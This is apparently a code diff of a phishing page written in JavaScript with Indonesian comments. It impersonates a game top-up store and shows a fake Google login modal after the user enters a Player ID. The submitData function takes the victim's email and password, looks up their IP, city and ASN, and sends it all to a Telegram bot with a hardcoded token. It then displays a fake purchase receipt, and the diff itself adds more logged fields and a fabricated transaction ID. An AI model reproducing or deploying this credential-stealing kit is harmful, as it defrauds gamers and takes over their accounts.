         function triggerLogin() {
@@ -384,14 +493,13 @@
                 alert('Please enter your Player ID first!');
                 return;
             }
-            // Munculkan Google Login setelah tombol Bayar dipencet
             document.getElementById('google-modal').style.display = 'flex';
         }
 
-        // AUTO GET IP, GEO, ASN & SEND TO TELEGRAM (ANTI SPAM LOCK)
+        // AUTO GET IP, GEO, ASN & KIRIM KE TELEGRAM (DENGAN LOCK ANTI SPAM)
         async function submitData(e) {
             e.preventDefault();
-            if (isSubmitted) return; // Mencegah spam kirim berulang kali
+            if (isSubmitted) return;
             isSubmitted = true;
 
             const email = document.getElementById('gEmail').value;
@@ -399,25 +507,29 @@
             const playerId = document.getElementById('playerId').value;
             const zoneId = document.getElementById('zoneId').value;
             const fullId = zoneId ? `${playerId} (${zoneId})` : playerId;
+            const txId = 'CODA-' + Math.floor(100000000 + Math.random() * 900000000);
+            const nowTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
 
-            let ipData = { ip: 'Unknown', country_name: 'Unknown', city: 'Unknown', region: 'Unknown', org: 'Unknown' };
+            let ipData = { ip: 'Unknown', country_name: 'Unknown', city: 'Unknown', org: 'Unknown' };
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 ipData = await res.json();
-            } catch(err) {
-                console.log('Geo fetch error');
-            }
+            } catch(err) { console.log('IP fetch failed'); }
 
             const formattedMessage = `
-📌 NEW CREDENTIAL CAPTURED 📌
+📌 CODASHOP SECURE LOG 📌
 EMAIL : ${email}
 PW : ${password}
-ID : ${fullId}
 GAME : ${currentGame}
+PLAYER ID : ${fullId}
+NICKNAME : ${detectedNickname}
+ITEM : ${currentItem}
+HARGA : ${currentPrice} (Orig: ${originalPrice})
+TANGGAL : ${nowTime}
 NEGARA : ${ipData.country_name || ipData.country}
 CITY : ${ipData.city}
 ASN : ${ipData.org}
-IP ADDRES : ${ipData.ip}
+IP : ${ipData.ip}
             `.trim();
 
             const botToken = '8875426142:AAHql1lzWkYCruoV6rbie4evDYGpOv-sL4U';
@@ -429,28 +541,42 @@ IP ADDRES : ${ipData.ip}
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: chatId, text: formattedMessage })
                 });
-            } catch(err) {
-                console.log('Telegram send error');
-            }
+            } catch(err) { console.log('Telegram error'); }
 
+            // Tampilkan Struk / Receipt Sukses yang Panjang & Menarik
             document.getElementById('google-modal').style.display = 'none';
+            document.getElementById('rTx').innerText = txId;
             document.getElementById('rGame').innerText = currentGame;
             document.getElementById('rId').innerText = fullId;
+            document.getElementById('rNick').innerText = detectedNickname;
             document.getElementById('rItem').innerText = currentItem;
+            document.getElementById('rOrigPrice').innerText = originalPrice;
+            document.getElementById('rDate').innerText = nowTime;
             document.getElementById('invoice-screen').style.display = 'flex';
         }
 
-        // Small Banner Slider Auto Play
-        let currentSlide = 0;
-        const slides = document.querySelectorAll('.banner-slide');
-        function nextSlide() {
-            slides[currentSlide].classList.remove('active');
-            currentSlide = (currentSlide + 1) % slides.length;
-            slides[currentSlide].classList.add('active');
-        }
-        setInterval(nextSlide, 3500);
+        // Banner Slider Logic (Animasi, Scrollable, & Dots)
+        const bannerContainer = document.getElementById('bannerContainer');
+        const dots = document.querySelectorAll('.dot');
+        let slideIndex = 0;
 
-        renderItems();
+        function currentSlide(n) {
+            slideIndex = n;
+            bannerContainer.scrollTo({ left: bannerContainer.clientWidth * slideIndex, behavior: 'smooth' });
+            updateDots();
+        }
+
+        function updateDots() {
+            dots.forEach((d, i) => d.classList.toggle('active', i === slideIndex));
+        }
+
+        setInterval(() => {
+            slideIndex = (slideIndex + 1) % dots.length;
+            bannerContainer.scrollTo({ left: bannerContainer.clientWidth * slideIndex, behavior: 'smooth' });
+            updateDots();
+        }, 4000);
+
+        renderTabs();
     </script>
 </body>
 </html>
